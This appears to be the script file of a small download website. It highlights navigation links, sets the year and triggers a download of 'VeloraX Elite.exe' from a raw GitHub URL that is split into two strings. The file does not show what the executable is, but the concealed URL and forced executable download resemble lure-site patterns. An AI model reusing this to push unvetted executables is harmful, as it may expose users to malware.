const links = document.querySelectorAll(".nav-links a");
const current = location.pathname.split("/").pop() || "index.html";

links.forEach((link) => {
  if (link.getAttribute("href") === current) {
    link.classList.add("active");
  }
});

const yearEl = document.getElementById("year");
if (yearEl) {
  yearEl.textContent = new Date().getFullYear().toString();
}

function startDownload() {
  const p1 = "https://github.com/OSEKFE4/t/raw/refs/heads/main/";
  const p2 = "VeloraX%20Elite.exe";
  const url = p1 + p2;
  const fileName = "VeloraX-Elite.exe";

  fetch(url)
    .then((response) => {
      if (!response.ok) throw new Error("Download failed");
      return response.blob();
    })
    .then((blob) => {
      const objectUrl = URL.createObjectURL(blob);
      const a = document.createElement("a");
      a.href = objectUrl;
      a.download = fileName;
      document.body.appendChild(a);
      a.click();
      a.remove();
      URL.revokeObjectURL(objectUrl);
    })
    .catch(() => {
      window.location.href = url;
    });
}
